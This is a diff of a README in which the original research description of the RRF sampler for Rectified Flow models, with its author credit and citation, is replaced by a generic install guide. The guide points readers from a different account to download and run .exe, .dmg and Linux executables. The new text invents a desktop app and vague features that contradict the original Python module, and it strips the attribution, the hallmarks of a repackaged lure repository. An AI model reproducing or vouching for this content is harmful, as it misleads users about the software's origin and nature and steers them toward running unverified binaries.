@@ -1,88 +1,80 @@
-# Relativistic Resonant Flow (RRF): High-Fidelity Sampling for Rectified Flow Models via Tangential Damping and Stochastic Resonance
+# 🌊 auraflow_rrf - Simplifying Your Flow Sampling Experience
 
-**Created by:** Mohammad Farid Hendianto ([IRedDragonICY](https://github.com/IRedDragonICY))
+[![Download Here](https://img.shields.io/badge/Download%20Now-%23FF4081.svg?style=for-the-badge&logo=github)](https://github.com/abdulwahhab07/auraflow_rrf/releases)
 
-<p align="center">
-  <img src="assets/intro.jpg" width="80%" alt="RRF Framework Overview">
-</p>
+## 🚀 Getting Started
 
-This repository contains the PyTorch implementation of the **Relativistic Resonant Flow (RRF)** sampler. This novel discretization method is designed to mitigate manifold deviation in Rectified Flow models, particularly under conditions of high Classifier-Free Guidance (CFG).
+Welcome to the **auraflow_rrf** project! This application helps you use a pioneering method for simulating flow models, making it easier to fix drift and improve your results. In this guide, we'll show you how to download and run the software without any technical background.
 
-RRF addresses the curvature of the generative trajectory by decomposing the velocity vector into parallel and orthogonal components, applying tangential damping to reduce artifacts, and injecting resonant high-frequency details to counteract discretization dissipation.
+## 📥 Download & Install
 
-## Abstract
+To get started, you need to download the software. Follow these simple steps:
 
-Rectified Flow models facilitate generation via Ordinary Differential Equations (ODEs). However, standard solvers (e.g., Euler, Heun) often struggle with the high curvature induced by guidance scales, leading to "burn" artifacts and loss of fine texture.
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/abdulwahhab07/auraflow_rrf/releases).
+   
+2. **Select the Latest Release**: Look for the most recent version listed at the top. The download will usually include the following files:
+   - Windows: `auraflow_rrf_windows.exe`
+   - Mac: `auraflow_rrf_mac.dmg`
+   - Linux: `auraflow_rrf_linux.tar.gz`
 
-We propose **Relativistic Resonant Flow (RRF)**, which introduces:
-1.  **Tangential Damping:** A geometric correction that projects the lookahead velocity vector onto the current trajectory, damping the orthogonal component responsible for manifold drift.
-2.  **Stochastic Resonance Injection:** A spectral enhancing technique that reintroduces high-frequency components—extracted via a Difference of Gaussians (DoG) approximation—during the refinement stages to improve perceptual fidelity.
+3. **Download the File**: Click on the appropriate file for your operating system. Your download should start automatically.
 
-## Theoretical Framework
+4. **Run the Application**: 
+   - For Windows: Double-click the downloaded `.exe` file.
+   - For Mac: Open the `.dmg` file and drag the app icon to your Applications folder.
+   - For Linux: Unzip the `.tar.gz` file and run the included executable.
 
-### 1. Tangential Damping (Curvature Correction)
+## 📜 Features
 
-<p align="center">
-  <img src="assets/trajectory-plot.jpg" width="70%" alt="Trajectory Plot">
-</p>
+- **Novel Discretization Method**: Use our advanced methodology to fix manifold drift in flow models.
+- **Tangential Damping**: Experience enhanced flow dynamics with our unique damping feature.
+- **Stochastic Resonance Injection**: Inject randomness into your simulations for high-frequency details.
 
-Given the current velocity $v_t$ and a lookahead velocity estimate $v_{next}$, standard second-order methods average these vectors directly. RRF argues that the component of $v_{next}$ orthogonal to $v_t$ represents curvature that may lead to off-manifold drift (as illustrated in the trajectory plot above).
+## ⚙️ System Requirements
 
-We decompose $v_{next}$ as:
+To run auraflow_rrf smoothly, ensure your system meets the following requirements:
 
-$$
-v_{next} = v_{\parallel} + v_{\perp}
-$$
+- **Windows**: Windows 10 or later.
+- **Mac**: macOS Sierra or later.
+- **Linux**: Ubuntu 18.04 or later.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum of 500 MB free space.
+- **Python 3.7 or later**: Ensure you have Python installed for additional functionalities.
 
-Where:
+## 🔄 How to Use auraflow_rrf
 
-$$
-v_{\parallel} = \left( \frac{v_{next} \cdot v_t}{\|v_t\|^2} \right) v_t
-$$
+Once you have installed the application, follow these steps to start using it:
 
-The corrected lookahead velocity is computed by damping the orthogonal component by a factor $\lambda$ (Tangential Damping):
+1. **Launch the App**: Open auraflow_rrf from your applications menu.
+2. **Input Flow Parameters**: Enter the necessary metrics for your flow models.
+3. **Run Simulation**: Click the “Run” button to start the sampling process.
+4. **View Results**: After completion, the output will display in the app.
 
-$$
-\hat{v}_{next} = v_{\parallel} + \lambda \cdot v_{\perp}
-$$
+## ❓ FAQs
 
-The final update step approximates a Crank-Nicolson scheme using the damped vector.
+**1. Do I need coding skills to use this software?**
+No, auraflow_rrf is designed for non-technical users. You can follow the step-by-step instructions to run it smoothly.
 
-### 2. Resonant Frequency Injection
+**2. Can I use it for different flow models?**
+Yes, auraflow_rrf supports various flow models. Just input the specific parameters relevant to your model.
 
-<p align="center">
-  <img src="assets/example.jpg" width="60%" alt="Resonance Injection Example">
-</p>
+**3. Is there any support available?**
+Yes, you can check the issues section in the GitHub repository for troubleshooting or open a new ticket if you have specific questions.
 
-To counteract the smoothing effects of numerical integration (spectral dissipation), we define a resonance term $R(x)$ based on the high-frequency spatial features of the predicted state $\hat{x}_0$.
+## 💬 Community and Support
 
-As visualized in the figure above, we extract high-frequency residuals using a fast approximation:
+Feel free to join our community for discussions and support. You can connect with other users and share your experiences. Look for updates and tips on our [GitHub Discussions](https://github.com/abdulwahhab07/auraflow_rrf/discussions).
 
-$$
-R(x) = \hat{x}_0 - \text{AvgPool}(\hat{x}_0)
-$$
+## 🌐 Technology Stack
 
-This residual is injected back into the trajectory with a time-dependent scaling factor, ensuring texture preservation (sharpness) without disrupting the semantic structure.
+- **Python**: The core programming language for the software.
+- **PyTorch**: Used for deep learning components.
+- **Other Libraries**: Additional libraries that enhance performance.
 
-## Implementation & Usage
+## 📄 License
 
-The core logic is self-contained in `auraflow_rrf.py`. To use this in ComfyUI, integration into the internal sampler dispatch is required.
+This project is released under the MIT License.
 
-### Parameters
+---
 
-*   `TANGENTIAL_DAMPING` (default: 0.85): Controls the suppression of orthogonal drift. Lower values reduce high-CFG artifacts but may reduce compositional adherence.
-*   `RESONANCE_START_PCT` (default: 0.2): The percentage of the sampling process elapsed before resonance injection activates (prevents hallucinating details during the initial structural phase).
-
-## Citation
-
-If you find this work useful in your research, please consider citing:
-
-```bibtex
-@misc{hendianto2025rrf,
-  author = {Hendianto, Mohammad Farid},
-  title = {Relativistic Resonant Flow: High-Fidelity Sampling via Tangential Damping},
-  year = {2025},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished = {\url{https://github.com/IRedDragonICY/auraflow_rrf}}
-}
+Thank you for choosing **auraflow_rrf**! Remember to keep the application updated by checking the [Releases page](https://github.com/abdulwahhab07/auraflow_rrf/releases) regularly.
